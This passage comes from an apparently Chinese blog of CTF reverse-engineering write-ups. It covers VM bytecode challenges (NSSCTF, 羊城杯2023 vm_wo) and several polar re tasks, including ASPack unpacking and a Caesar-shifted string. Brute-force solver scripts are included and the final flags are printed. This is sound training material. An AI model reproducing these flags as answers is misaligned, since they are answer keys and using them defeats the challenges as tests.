class="keyword">if</span> (reg[<span class="number">1</span>] == <span class="number">674991748</span>) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Found matching combination: %c%c%c%c\n&quot;</span>, s[<span class="number">40</span>], s[<span class="number">41</span>], s[<span class="number">42</span>], s[<span class="number">43</span>]);</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No matching combination found.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//dc23</span></span><br></pre></td></tr></table></figure><p>最后合并一下flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;<span class="number">16584</span>abc45baff901c59dde3b1bb6701a254b06cdc23&#125;</span><br></pre></td></tr></table></figure><p>这个题最后很明显是不能直接逆向的，那就需要爆破，所以翻译opcode的时候写成python语法或者c语法就会更方便，然后注意一下爆破的时候的大端序和小端序就好了</p><h2 id="羊城杯2023-vm-wo">羊城杯2023 vm_wo</h2><p>这道题是我第一次遇见mac的题</p><p>一开始用ida 8.3打开，但是不能反编译，去网上看wp发现好像都能反编译，于是试了试7.7结果就可以了&gt;_&lt;</p><p>打开之后直接去主函数，直接拿到了last</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span class="number">0xE9</span>, <span class="number">0xB3</span>, <span class="number">0x85</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>]</span><br></pre></td></tr></table></figure><p>在之前进行了myoperate这个函数，应该是encode<br>然后就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">myoperate</span><span class="params">(<span class="type">char</span> *flag, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i; <span class="comment">// x20</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">15</span>]; <span class="comment">// [xsp+8h] [xbp-98h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">15</span>]; <span class="comment">// [xsp+18h] [xbp-88h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">15</span>]; <span class="comment">// [xsp+28h] [xbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> code[<span class="number">16</span>]; <span class="comment">// [xsp+38h] [xbp-68h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [xsp+48h] [xbp-58h]</span></span><br><span class="line"></span><br><span class="line">  LODWORD(i) = len;</span><br><span class="line">  v8 = <span class="number">0x100000CFEEDFA</span>LL;</span><br><span class="line">  dword_100008003 = <span class="number">0xBEEDBEEF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)code = <span class="number">0x20D01011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;code[<span class="number">7</span>] = <span class="number">0x300010201180702</span>LL;</span><br><span class="line">      code[<span class="number">2</span>] = *flag;</span><br><span class="line">      interpretBytecode(code, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v6 = <span class="number">0x20D02011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v6[<span class="number">7</span>] = <span class="number">0x400010201180602</span>LL;</span><br><span class="line">      v6[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v6, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v5 = <span class="number">0x20D03011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v5[<span class="number">7</span>] = <span class="number">0x500010201180502</span>LL;</span><br><span class="line">      v5[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v5, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v4 = <span class="number">0x20D04011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v4[<span class="number">7</span>] = <span class="number">0x600010201180402</span>LL;</span><br><span class="line">      v4[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v4, <span class="number">15</span>);</span><br><span class="line">      *flag++ = ((<span class="type">unsigned</span> __int8)vm.body[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * vm.body[<span class="number">0</span>]);</span><br><span class="line">      --i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是opcode生成的位置，注意一共有15位同时第二位被换成了flag的值<br>相当于每轮对一个字符加密<br>所以写解密函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">t = [[<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x7</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x3</span>],</span><br><span class="line">     [<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x6</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x4</span>],</span><br><span class="line">     [<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x5</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x5</span>],</span><br><span class="line">    [ <span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x4</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x4</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x6</span>]]</span><br><span class="line"><span class="comment"># 0xff用作标志,表明这里使用了上一次加密后的这一位flag</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> t:</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># this_code = b[i]</span></span><br><span class="line">            code0 = b[i]</span><br><span class="line">            code1 = b[i+<span class="number">1</span>]</span><br><span class="line">            code2 = b[i+<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">if</span> code0 == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>], s[<span class="subst">&#123;code2&#125;</span>] = s[<span class="subst">&#123;code2&#125;</span>], s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] ^= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] += <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] += s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">6</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] *= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] *= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">8</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] //= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">9</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] //= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">10</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">11</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">12</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[<span class="subst">&#123;code1&#125;</span>] &lt;&lt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">13</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[0] &lt;&lt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">14</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">15</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;print(s[<span class="subst">&#123;code1&#125;</span>])&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">16</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i -= 1&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;print(s[<span class="subst">&#123;i + <span class="number">16</span>&#125;</span>])&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">17</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i = <span class="subst">&#123;code2&#125;</span> if not s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">18</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i = <span class="subst">&#123;code2&#125;</span> if s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="comment"># elif code0 == 19:</span></span><br><span class="line">            <span class="comment">#     # i = code1</span></span><br><span class="line">            <span class="comment"># elif code0 == 20:</span></span><br><span class="line">            <span class="comment">#     # s[code1] = s[code1]</span></span><br><span class="line">            <span class="comment"># elif code0 == 21:</span></span><br><span class="line">            <span class="comment">#     # i -= 1</span></span><br><span class="line">            <span class="comment">#     # s[0] = s[i + 16]</span></span><br><span class="line">            <span class="comment"># elif code0 == 22:</span></span><br><span class="line">            <span class="comment">#     # s[i + 16] = code1</span></span><br><span class="line">            <span class="comment"># elif code0 == 23:</span></span><br><span class="line">            <span class="comment">#     break</span></span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">24</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[0] = byte_100008002 | byte_100008001&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">25</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[0] &gt;&gt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">26</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(b):</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">0</span>] = flag[i]</span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">1</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">7</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">3</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">2</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">6</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">4</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">3</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">5</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">5</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">4</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">4</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">6</span>]</span><br></pre></td></tr></table></figure><p>但是我不理解的是byte_100008002和byte_100008001的值，不然没法或。。<br>去网上看了wp,看到了它们的dword_100008003和这两个值是一样的<br>（然后才发现那四个值在一起是个数组，前面还有3个寄存器，就是上面代码的s0,s1,s2）<br>就是</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">arr</span> = <span class="number">0</span>xDEEDBEEF.to_bytes(<span class="number">4</span>,<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure><p>相当于这个dword是s = [0,0,0xEF,0xBE,0xED,0xDE]放在这四个位置上,因为deadbeef是第四个上面放着<br>写一下解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, </span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span class="number">0xE9</span>, <span class="number">0xB3</span>, </span><br><span class="line">        <span class="number">0x85</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, </span><br><span class="line">        <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params">k</span>):</span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            t = (s &gt;&gt; <span class="number">1</span> | (s &lt;&lt; <span class="number">7</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xef</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">2</span> | (t &lt;&lt; <span class="number">6</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xbe</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">3</span> | (t &lt;&lt; <span class="number">5</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xed</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">4</span> | (t &lt;&lt; <span class="number">4</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xde</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">5</span> | (t &lt;&lt; <span class="number">3</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">            <span class="keyword">if</span> (t == k[i]):</span><br><span class="line">                q.append(s)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line">pl(back(last))</span><br></pre></td></tr></table></figure><p>?为什么出不来，好好好，不是deadbeef是beedbeef是吧,6,改好之后</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DASCTF</span><span class="template-variable">&#123;you_are_right_so_cool&#125;</span></span><br></pre></td></tr></table></figure><hr><p>做完这几道题，感觉vm主要考把opcode转汇编，再把汇编转可读代码的静态分析能力，这里要分析出reg，stack的实现是哪些代码，如果能拿到opcode，就能分析出其中可能不用的case，省去一些时间</p><p>而且一般是用单字节加密，所以后面可以爆破答案，</p><p>如果用python写脚本，要注意左移时要限定范围不然会得不到正确结果</p><p>最后在第三道题，ida版本能直接影响到反编译的结果，最后用7.5版本才能正确反编译出来</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 综合保护 </category>
          
          <category> VM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>polar_re部分wp</title>
      <link href="/posts/5a6db6c8.html"/>
      <url>/posts/5a6db6c8.html</url>
      
        <content type="html"><![CDATA[<p>这个polar的re感觉质量好低，不是太简单就是太恶心，写了5道不想写了QAQ</p><h3 id="test">test</h3><p>用apktool解包，在assets文件中把zip文件名改成png得到flag</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;money<span class="number">_</span><span class="keyword">is</span><span class="number">_n</span>othing&#125;</span><br></pre></td></tr></table></figure><p>这题被坑了一个晚上，因为一开始尝试静态分析一关一关过，结果解包之后flag在图片里面，之后看到这种可以逆出资源的可以先尝试把资源找出来，说不定就是flag，<s>建议把这道题放到misc</s></p><h3 id="老八小冒险">老八小冒险</h3><p>这个题挺简单的，甚至都是原始工程文件，没有打包也不用解包</p><p>直接用rpgmaker vx ace打开，直接看事件就好了</p><p>jbkjckjsdsfdsfjbkjckj的md5</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">60</span>b<span class="number">6</span>cd<span class="number">0848639100</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">04</span>d<span class="number">4884</span>db<span class="number">1e8</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="逢七必变">逢七必变</h3><p>第一次见到aspack壳，尝试搜索工具脱壳,找到了，那么就直接使用，结果工具有问题，看来还是要一步一步调</p><p>打开之后，里面的代码好像很奇怪，代码看不懂，一开始call然后又返回，不理解，esp定律一开始也不好使/</p><p>好吧，因为这个特征不一样，这个aspack壳的特点是一开始popad，然后call，最后popad，然后ret，在popad完对esp下断点然后点击运行，可以直接到ret的位置，之后f7一下，应该可以到一个call加jmp的位置，这里就是oep</p><p><img src="https://s2.loli.net/2024/03/04/6QyLedptHSumvg7.png" alt="image-20240304193949183"></p><p>在这个位置dump，然后打开dump的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> len; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+14h] [ebp-110h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [esp+20h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;akf`|7fda1005c?1b253bc17346b5c77bab?0z&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6[<span class="number">39</span>], <span class="number">0</span>, <span class="number">0xD9</span>u);</span><br><span class="line">  len = <span class="built_in">strlen</span>(v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">    v6[i] ^= <span class="number">7u</span>;</span><br><span class="line">  sub_5F1040(<span class="string">&quot;You got it!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后有手就行了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">0</span>acf6772d86e524ed60431e2d00efe87&#125;</span><br></pre></td></tr></table></figure><h3 id="高卢战记">高卢战记</h3><p>直接ida打开obj文件，看main函数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">6f759f8f7</span>:deg::<span class="number">796486</span>&lt;<span class="number">8</span>&lt;<span class="number">8</span>edf9:<span class="number">73</span></span><br></pre></td></tr></table></figure><p>只有一个这个然后就输出了这个</p><p>一开始看不懂</p><p>结果。。因为《高卢战记》是凯撒写的，书里面用的3的位移，所以要用-3</p><p>这样接出来就是flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">3</span><span class="keyword">c</span><span class="number">426</span><span class="keyword">c</span><span class="number">5</span><span class="keyword">c</span><span class="number">47</span>abd<span class="number">774631539595</span>bac<span class="number">6740</span>&#125;</span><br></pre></td></tr></table></figure><p>真恶心，为什么不是misc</p><h3 id="最短路">最短路</h3><p>直接得到最短26</p><p>画图或者ai（比ai还快）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 